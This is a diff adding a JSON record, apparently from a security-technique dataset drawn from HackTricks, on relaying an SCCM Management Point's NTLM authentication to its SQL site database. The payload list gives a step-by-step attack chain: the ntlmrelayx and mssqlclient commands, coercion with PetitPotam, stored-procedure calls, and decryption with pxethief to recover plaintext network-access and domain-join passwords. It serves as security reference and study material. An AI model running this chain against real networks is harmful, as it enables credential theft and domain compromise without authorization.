@@ -1,0 +1,27 @@
+{
+  "id": "windows_hardening_824071c4d0d2",
+  "category": "windows-hardening",
+  "title": "sccm management point relay sql policy secrets",
+  "description": "# SCCM Management Point NTLM Relay to SQL \u2013 OSD Policy Secret Extraction\n\n{{#include ../../banners/hacktricks-training.md}}\n\n## TL;DR\nBy coercing a **System Center Configuration Manager (SCCM) Management Point (MP)** to authenticate over SMB/RPC and **relaying** that NTLM machine account to the **site database (MSSQL)** you obtain `smsdbrole_MP` / `smsdbrole_MPUserSvc` rights.  These roles let you call a set of stored procedures that expose **Operating System Deployment (OSD)** policy blobs (Net",
+  "payloads": [
+    "# SCCM Management Point NTLM Relay to SQL \u2013 OSD Policy Secret Extraction",
+    "{{#include ../../banners/hacktricks-training.md}}",
+    "## TL;DR",
+    "By coercing a **System Center Configuration Manager (SCCM) Management Point (MP)** to authenticate over SMB/RPC and **relaying** that NTLM machine account to the **site database (MSSQL)** you obtain `smsdbrole_MP` / `smsdbrole_MPUserSvc` rights.  These roles let you call a set of stored procedures that expose **Operating System Deployment (OSD)** policy blobs (Network Access Account credentials, Task-Sequence variables, etc.).  The blobs are hex-encoded/encrypted but can be decoded and decrypted with **PXEthief**, yielding plaintext secrets.",
+    "High-level chain:",
+    "1. Discover MP & site DB \u21a6 unauthenticated HTTP endpoint `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.",
+    "2. Start `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.",
+    "3. Coerce MP using **PetitPotam**, PrinterBug, DFSCoerce, etc.",
+    "4. Through the SOCKS proxy connect with `mssqlclient.py -windows-auth` as the relayed **<DOMAIN>\\\\<MP-host>$** account.",
+    "5. Execute:",
+    "* `use CM_<SiteCode>`",
+    "* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`",
+    "* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (or `MP_GetPolicyBodyAfterAuthorization`)",
+    "6. Strip `0xFFFE` BOM, `xxd -r -p` \u2192 XML  \u2192 `python3 pxethief.py 7 <hex>`.",
+    "Secrets such as `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password`, etc. are recovered without touching PXE or clients."
+  ],
+  "source": "HackTricks",
+  "references": [
+    "/workspaces/hunter-skill/hacktricks/src/windows-hardening/active-directory-methodology/sccm-management-point-relay-sql-policy-secrets.md"
+  ]
+}
